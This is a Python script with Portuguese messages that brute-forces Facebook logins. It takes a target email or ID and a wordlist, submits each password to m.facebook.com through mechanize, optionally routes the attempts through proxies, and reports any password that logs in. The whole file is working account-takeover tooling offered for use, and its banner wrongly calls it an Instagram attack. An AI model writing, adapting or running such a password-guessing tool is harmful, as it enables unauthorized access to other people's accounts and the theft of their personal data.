import mechanize
from proxyis import proxy_fb
from Zerasus import menu
from colores import *

try:
    proxymain()
    optio = input("-> ")
    clear()

    select_an_username()
    email = input("\n-> Id or email: ")
    clear()

    select_an_wordlist()
    wl = input("\n-> ")
    clear()

    print(f"{color.GREEN}Brute Instagram -> Target={email} Wordlist={wl} {color.END}")
    senhas = open(f"{wl}", 'rt', encoding='latin')

    def proxyno():

        for senha in senhas.read().splitlines():
            url = 'https://m.facebook.com/'
            loggedin_title = 'Facebook'
            username = email
            password = senha

            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36')]
            browser.open(url)
            sleep(4)

            browser.select_form(nr=0)
            browser.form["email"] = username
            browser.form["pass"] = password
            browser.submit()

            if browser.title() == loggedin_title:
                print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {email}:{password}{color.END}")
                exit()
            elif browser.title() == "Verifique os detalhes de login mostrados. Foi você?":
                print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {email}:{password}{color.END}")
                exit()
            else:
                print(f"[{color.RED} - {color.END}] {color.RED}Senha Incorreta: {color.END} password {senha}")


    def proxyes():
        proxy_fb()
        for senha in senhas.read().splitlines():
            url = 'https://m.facebook.com/'
            loggedin_title = 'Facebook'
            username = email
            password = senha

            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36')]
            browser.open(url)
            sleep(4)

            browser.select_form(nr=0)
            browser.form["email"] = username
            browser.form["pass"] = password
            browser.submit()

            if browser.title() == loggedin_title:
                print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {email}:{password}{color.END}")
                exit()
            elif browser.title() == "Verifique os detalhes de login mostrados. Foi você?":
                print(f"\r\n{color.CYAN}[ + ] SENHA ENCONTRADA [ + ]\r\nAccount: {email}:{password}{color.END}")
                exit()
            else:
                print(f"[{color.RED} - {color.END}] {color.RED}Senha Incorreta: {color.END} password {senha}")

    if optio == '1':
        proxyno()
    elif optio == '2':
        proxyes()
    else:
        print("Informe uma opcao na proxima")
        sleep(3)
        clear()
        print("De volta para o Menu!")
        sleep(2)
        menu()
except Exception:
    print(f"Ocorreu um erro: {Exception}")
    sleep(3)
    clear()
    print("De volta para o Menu!")
    sleep(2)
    menu()

